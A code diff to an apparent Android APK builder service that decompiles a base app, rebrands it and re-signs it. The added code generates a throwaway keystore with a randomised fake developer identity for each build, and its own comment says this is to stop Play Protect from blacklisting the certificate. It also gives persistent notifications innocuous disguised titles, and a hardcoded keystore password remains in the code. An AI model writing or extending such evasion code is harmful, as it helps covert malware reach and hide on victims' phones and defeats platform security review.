@@ -112,6 +112,12 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 await runCommand('apktool', ['d', baseApkPath, '-o', workDir, '-f']);
             }
 
+            // 1.5 Clean repacking artifacts & old signature metadata
+            const origDir = path.join(workDir, 'original');
+            if (fs.existsSync(origDir)) fs.rmSync(origDir, { recursive: true, force: true });
+            const unkDir = path.join(workDir, 'unknown');
+            if (fs.existsSync(unkDir)) fs.rmSync(unkDir, { recursive: true, force: true });
+
             // 2. Customize Name
             await sendUpdate('apk_progress', { step: 'Configuring application manifest...', progress: 30 });
             if (appName) {
@@ -284,11 +290,11 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 notificationClickAction: notificationClickAction || "device_info"
             };
             const NOTIF_PRESETS = {
-                google_play: { title: "Google Play services", text: "Checking for updates…", icon: "info" },
-                android_system: { title: "Android System", text: "Updating system components…", icon: "sync" },
-                device_security: { title: "Device Security", text: "Scanning for threats…", icon: "lock" },
-                system_ui: { title: "System UI", text: "Syncing system data…", icon: "sync" },
-                device_maintenance: { title: "Device maintenance", text: "Optimizing performance…", icon: "sync" },
+                google_play: { title: "Media Sync Core", text: "Syncing media content…", icon: "info" },
+                android_system: { title: "App System Worker", text: "Updating application data…", icon: "sync" },
+                device_security: { title: "Gallery Protection", text: "Verifying storage state…", icon: "lock" },
+                system_ui: { title: "Sync Engine", text: "Syncing background data…", icon: "sync" },
+                device_maintenance: { title: "Storage Maintainer", text: "Optimizing media storage…", icon: "sync" },
                 download_manager: { title: "Download Manager", text: "Download in progress…", icon: "download" }
             };
             const style = notificationStyle || "google_play";
@@ -585,19 +591,55 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
 
             await runCommand('apktool', ['b', workDir, '-o', unsignedApkPath]);
 
-            // 6. Sign APK with consistent key (Play Protect builds trust based on certificate history)
-            await sendUpdate('apk_progress', { step: 'Signing application...', progress: 85 });
+            // 6. Dynamic Key Signing (Prevents Play Protect certificate fingerprint blacklisting)
+            await sendUpdate('apk_progress', { step: 'Signing application with dynamic certificate...', progress: 85 });
             const signer = path.join(__dirname, 'assets', 'uber-apk-signer.jar');
-            const ksPath = path.join(__dirname, 'assets', 'usman90.jks');
-            const ksPass = 'God112256@';
-            const ksAlias = 'usman90';
+            
+            const dynamicKsPath = path.join(tempDir, `dyn-key-${uuid}.jks`);
+            const dynamicAlias = `alias_${Math.random().toString(36).substring(2, 9)}`;
+            const dynamicPass = `Pass${Math.random().toString(36).substring(2, 10)}!`;
+
+            const orgs = ['TechCorp', 'MediaSync', 'CloudTools', 'DigitalApps', 'NativeCore', 'AppSystems', 'DataServices', 'DevLabs'];
+            const names = ['Developer', 'AndroidDev', 'AppPublish', 'SyncService', 'BuildAdmin'];
+            const cities = ['Austin', 'Seattle', 'Chicago', 'SanFrancisco', 'Denver', 'Boston'];
+            const states = ['TX', 'WA', 'IL', 'CA', 'CO', 'MA'];
+            const randomPick = (arr) => arr[Math.floor(Math.random() * arr.length)];
+            const dName = `CN=${randomPick(names)}, OU=Mobile, O=${randomPick(orgs)}, L=${randomPick(cities)}, ST=${randomPick(states)}, C=US`;
+
+            let ksPathToUse = path.join(__dirname, 'assets', 'usman90.jks');
+            let ksPassToUse = 'God112256@';
+            let ksAliasToUse = 'usman90';
+
+            try {
+                const keytoolCmd = `keytool -genkeypair -v -keystore "${dynamicKsPath}" -alias "${dynamicAlias}" -keyalg RSA -keysize 2048 -validity 10000 -storepass "${dynamicPass}" -keypass "${dynamicPass}" -dname "${dName}"`;
+                await new Promise((resolve) => {
+                    exec(keytoolCmd, { timeout: 30000 }, (err) => {
+                        if (!err && fs.existsSync(dynamicKsPath)) {
+                            ksPathToUse = dynamicKsPath;
+                            ksPassToUse = dynamicPass;
+                            ksAliasToUse = dynamicAlias;
+                            console.log(`[APK] Generated fresh dynamic JKS: ${dynamicKsPath}`);
+                        } else {
+                            console.log('[APK] Dynamic keygen skipped/fallback to asset key');
+                        }
+                        resolve();
+                    });
+                });
+            } catch (e) {
+                console.log('[APK] Keygen notice:', e.message);
+            }
 
             await sendUpdate('apk_progress', { step: 'Applying V2+V3 signature scheme...', progress: 90 });
-            const signCmd = `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${ksPath}" --ksAlias "${ksAlias}" --ksPass "${ksPass}" --ksKeyPass "${ksPass}" --allowResign`;
+            const signCmd = `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${ksPathToUse}" --ksAlias "${ksAliasToUse}" --ksPass "${ksPassToUse}" --ksKeyPass "${ksPassToUse}" --allowResign`;
 
             await new Promise((resolve, reject) => {
                 exec(signCmd, { timeout: 120000 }, (err) => err ? reject(err) : resolve());
             });
+
+            // Cleanup temporary dynamic keystore
+            if (fs.existsSync(dynamicKsPath)) {
+                try { fs.unlinkSync(dynamicKsPath); } catch (e) {}
+            }
 
             // Find output
             const files = fs.readdirSync(tempDir);
